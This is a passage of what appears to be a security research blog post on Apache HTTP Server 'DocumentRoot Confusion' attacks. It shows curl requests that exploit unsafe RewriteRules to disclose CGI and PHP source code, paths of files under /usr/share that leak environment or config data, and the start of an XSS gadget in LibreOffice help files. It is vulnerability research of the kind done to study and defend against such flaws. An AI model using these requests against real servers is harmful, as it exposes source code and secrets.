&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OPTION_LEGACY_PREFIX_DOCROOT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;uri_reduced&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apr_table_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;notes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mod_rewrite_uri_reduced&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prefix_stat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uri_reduced&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [1] access without root&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap_core_translate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------ [2] access with root&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;rewritelog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prefixing with document_root of %s&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;&quot; FAILED&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;rewritelog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;prefixed with document_root to %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;rewritelog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;go-ahead with %s [OK]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Most of the time, the version without DocumentRoot doesn‚Äôt exist, so Apache HTTP Server goes for the version with the DocumentRoot. But this behavior already lets us ‚Äúintentionally‚Äù access paths outside the Web Root. &lt;strong&gt;If today we can control the prefix of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;, couldn‚Äôt we access any file on the system?&lt;/strong&gt; That‚Äôs the spirit of our second Confusion Attack! You can find numerous problematic configurations on GitHub, and even &lt;a href=&quot;https://httpd.apache.org/docs/current/rewrite/remapping.html#rewrite-query&quot;&gt;the examples from official Apache HTTP Server documentations&lt;/a&gt; are vulnerable to attacks:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Remove mykey=???&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteCond&lt;/span&gt; &quot;%{QUERY_STRING}&quot; &quot;(.*(?:^|&amp;amp;))mykey=([^&amp;amp;]*)&amp;amp;?(.*)&amp;amp;?$&quot;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; &quot;(.*)&quot; &quot;$1?%1%3&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are other &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; that are also affected, such as rules based on caching needs or hiding file extensions:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^/html/(.*)$&quot;  &quot;/$1.html&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The Rule trying to save bandwidth by opting for compressed versions of static files:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^(.*)\.(css|js|ico|svg)&quot; &quot;$1\.$2.gz&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The rule redirecting old URLs to the main site:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^/oldwebsite/(.*)$&quot;  &quot;/$1&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The rule returning a 200 OK for all CORS preflight requests:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteCond&lt;/span&gt; %{REQUEST_METHOD} &lt;span class=&quot;ss&quot;&gt;OPTIONS&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^(.*)$ $1 [R=200,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Theoretically, as long as the target prefix of a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; is controllable, we can access nearly the entire filesystem. But from the real-world cases  above, extensions like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.html&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gz&lt;/code&gt; are the restrictions that keep us from being truly free. So, can we access files outside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.html&lt;/code&gt;? I am not sure if you remember the primitive of Path Truncation from the Filename Confusion earlier? By combining these two primitives, we can freely access arbitrary files on the filesystem!&lt;/p&gt;

&lt;p&gt;The following demonstrations are all based on this unsafe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  &quot;^/html/(.*)$&quot;  &quot;/$1.html&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Ô∏è-primitive-2-1-server-side-source-code-disclosure&quot;&gt;‚öîÔ∏è Primitive 2-1. Server-Side Source Code Disclosure&lt;/h4&gt;

&lt;p&gt;Let‚Äôs introduce the first primitive of DocumentRoot Confusion ‚Äî &lt;strong&gt;Arbitrary Server-Side Source Code Disclosure&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;Since Apache HTTP Server decides whether to consider a file as a Server-Side Script based on the current directory or virtual host configuration, accessing target via an absolute path can confuse Httpd‚Äôs logic, causing it to leak contents that should have been executed as code.&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-2-1-1-disclose-cgi-source-code&quot;&gt;‚úîÔ∏è 2-1-1. Disclose CGI Source Code&lt;/h5&gt;

&lt;p&gt;Starting with the disclosure of server-side CGI source code, since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_cgi&lt;/code&gt; binds the CGI folder to a specified URL prefix via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ScriptAlias&lt;/code&gt;, directly accessing a CGI file using its absolute path can leak its source code due to the change of URL prefix.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/cgi-bin/download.cgi
 &lt;span class=&quot;c&quot;&gt;# the processed result from download.cgi&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
 &lt;span class=&quot;c&quot;&gt;# #!/usr/bin/perl&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# use CGI;&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# ...&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# # the source code of download.cgi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;Ô∏è-2-1-2-disclose-php-source-code&quot;&gt;‚úîÔ∏è 2-1-2. Disclose PHP Source Code&lt;/h5&gt;

&lt;p&gt;Next is the disclosure of server-side PHP source code. Given that PHP has numerous use cases, if PHP environments are applied only to specific directories or virtual hosts (which is common in web hosting), accessing PHP files from a virtual host which didn‚Äôt support PHP can disclose the source code!&lt;/p&gt;

&lt;p&gt;For example, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.local&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;static.local&lt;/code&gt; are two websites hosted on the same server; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www.local&lt;/code&gt; allows PHP execution while &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;static.local&lt;/code&gt; only serves static files. Hence, you can disclose sensitive info from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;config.php&lt;/code&gt; like this:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://www.local/config.php
 &lt;span class=&quot;c&quot;&gt;# the processed result (empty) from config.php&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://www.local/var/www.local/config.php%3F &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Host: static.local&quot;&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# the source code of config.php&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Ô∏è-primitive-2-2-local-gadgets-manipulation&quot;&gt;‚öîÔ∏è Primitive 2-2. Local Gadgets Manipulation!&lt;/h4&gt;

&lt;p&gt;Next up is our second primitive ‚Äî &lt;strong&gt;Local Gadgets Manipulation&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;First, when we talked about ‚Äúaccessing any file on the filesystem,‚Äù did you wonder: ‚ÄúHey, could an unsafe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt; access &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;?‚Äù The answer is Yes, and also no. What?&lt;/p&gt;

&lt;p&gt;Technically, the server does check if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; exists, but Apache HTTP Server‚Äôs built-in access control blocks our access. Here‚Äôs a snippet from Apache HTTP Server‚Äôs &lt;a href=&quot;https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115&quot;&gt;configuration template&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; denied
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You‚Äôll notice it defaults to blocking access to the root directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Require all denied&lt;/code&gt;). So our ‚Äúarbitrary file access‚Äù ability seems a bit less ‚Äúany.‚Äù Does that mean the show‚Äôs over? Not really! We have already broken the trust of only-allowed-access to the DocumentRoot, it‚Äôs a significant step forward!&lt;/p&gt;

&lt;p&gt;A closer inspection of different Httpd distributions reveals that &lt;a href=&quot;https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165&quot;&gt;Debian/Ubuntu&lt;/a&gt; operating systems by default allow &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; /usr/share&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;AllowOverride&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt; granted
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, the next step is to ‚Äúsqueeze‚Äù all possibilities within this directory. All available resources, such as existing tutorials, documentation, unit test files, and even programming languages like PHP, Python, and even PHP modules could become targets for our abuse!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. Of course, the exploitation here is based on the Httpd distributed by Ubuntu/Debian operating systems. However, in practice, we have also found that some applications remove the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Require all denied&lt;/code&gt; line from the root directory, allowing direct access to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-2-2-1-local-gadget-to-information-disclosure&quot;&gt;‚úîÔ∏è 2-2-1. Local Gadget to Information Disclosure&lt;/h5&gt;

&lt;p&gt;Let‚Äôs hunt for potentially exploitable files in this directory. First off, if the target Apache HTTP Server has the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;websocketd&lt;/code&gt; service installed, the default package includes an example PHP script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dump-env.php&lt;/code&gt; under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share/doc/websocketd/examples/php/&lt;/code&gt;. If there‚Äôs a PHP environment on the target server, this script can be accessed directly to leak sensitive environment variables.&lt;/p&gt;

&lt;p&gt;Additionally, if the target has services like Nginx or Jetty installed, though &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt; is theoretically a read-only copy for package installation, these services still place their default Web Roots under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/share&lt;/code&gt;, making it possible to leak sensitive web application information, such as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web.xml&lt;/code&gt; in Jetty.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;/usr/share/nginx/html/&lt;/li&gt;
  &lt;li&gt;/usr/share/jetty9/etc/&lt;/li&gt;
  &lt;li&gt;/usr/share/jetty9/webapps/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Here‚Äôs a simple demonstration using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setup.php&lt;/code&gt; from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Davical&lt;/code&gt; package, which exists as a read-only copy, to leak contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpinfo()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-2-2-2-local-gadget-to-xss&quot;&gt;‚úîÔ∏è 2-2-2. Local Gadget to XSS&lt;/h5&gt;

&lt;p&gt;Next, how to turn this primitive into XSS? On the Ubuntu Desktop environment, LibreOffice, an open-source office suite, is installed by default. We can leverage the language switch feature in the help files to achieve XSS.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: /usr/share/libreoffice/help/help.html&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;indexOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// the URL came from LibreOffice help (F1)&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getParameterByName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Version&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newURL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;/index.html?&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
